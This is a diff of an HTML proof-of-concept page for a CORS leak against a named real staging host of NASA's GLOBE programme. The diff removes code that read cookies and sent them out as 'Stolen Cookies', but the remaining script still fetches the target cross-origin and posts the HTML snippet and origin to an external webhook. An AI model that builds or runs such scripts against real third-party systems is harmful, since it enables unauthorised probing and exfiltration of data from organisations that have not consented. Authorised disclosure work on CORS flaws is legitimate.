@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>NASA CORS Session Exploit PoC</title>
+  <title>NASA CORS Leak PoC</title>
   <meta charset="UTF-8">
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
-  <h2>Simulating NASA CORS Exploit...</h2>
+  <h2>Simulating NASA CORS Exploit (No-Creds)...</h2>
   <pre id="output">Loading...</pre>
 
   <script>
@@ -13,17 +13,15 @@
 
     fetch("https://datasearchstaging.globe.gov/", {
       method: "GET",
-      credentials: "include",
-      mode: "cors"
+      mode: "cors" // no credentials
     })
     .then(res => res.text())
     .then(html => {
-      const cookies = document.cookie || "No cookies (likely HttpOnly)";
       const snippet = html.slice(0, 500);
 
-      // عرض الكوكيز و HTML في الصفحة
+      // عرض HTML فقط (no cookies)
       document.getElementById("output").innerText =
-        "Stolen Cookies:\n" + cookies + "\n\nHTML Snippet:\n" + snippet;
+        "HTML Snippet:\n" + snippet;
 
       // إرسال إلى Webhook كدليل
       fetch(webhook, {
@@ -32,7 +30,6 @@
         body: JSON.stringify({
           origin: location.origin,
           target: "https://datasearchstaging.globe.gov/",
-          stolen_cookies: cookies,
           html_snippet: snippet
         })
       });
